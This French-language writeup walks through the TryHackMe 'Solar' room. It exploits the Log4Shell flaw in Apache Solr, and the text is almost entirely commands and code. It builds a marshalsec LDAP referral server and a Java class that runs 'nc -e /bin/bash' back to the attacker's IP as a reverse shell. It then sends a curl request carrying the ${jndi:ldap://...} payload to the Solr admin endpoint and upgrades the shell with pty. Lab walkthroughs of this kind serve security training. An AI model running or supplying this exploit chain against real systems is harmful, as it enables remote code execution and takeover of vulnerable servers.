+++
title = "Solar"
authors = ["david-pellissier"]
date = 2021-12-15

[taxonomies]
categories = ["misc"]
+++

## Writeup de la room "Solar"

Lien: https://tryhackme.com/room/solar

Docker: **`sudo docker run -it --name "Kali" -p 1234:1234 -p 8000:8000 -p 1389:1389 kalilinux/kali /bin/bash `**



Installer toutes les dépendances: 

```bash
cd home
apt update
apt install -y netcat-traditional python3 curl wget git maven nano vim
wget https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u312-b07/OpenJDK8U-jdk_x64_linux_hotspot_8u312b07.tar.gz
tar xzf OpenJDK8U-jdk_x64_linux_hotspot_8u312b07.tar.gz 
echo 'export PATH=$PWD/jdk8u312-b07/bin:$PATH' >> .bashrc
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
```

Lancer le serveur LDAP

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.77.76:8000/#Exploit	
```

Créer le reverse shell

```bash
cd ~
mkdir exploit
cd exploit
nano Exploit.java # puis insérer le code ci-dessous
javac Exploit.java
```

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.9.77.76 1234");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Lancer le serveur python

```bash
python3 -m http.server
```

Ouvrir la connexion du reverse shell:

```
nc -lnvp 1234
```



Exécuter:

```bash
 curl 'http://10.10.91.84:8983/solr/admin/cores?foo=$\{jndi:ldap://10.9.77.76:1389/Exploit\}'
```

Résultat: on a un shell

À noter qu'il n'y a pas de "décoration" du shell au départ, mais qu'on peut quand même exécuter des commandes.

Pour rendre "user-friendly" le shell on peut lancer cette commande:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```



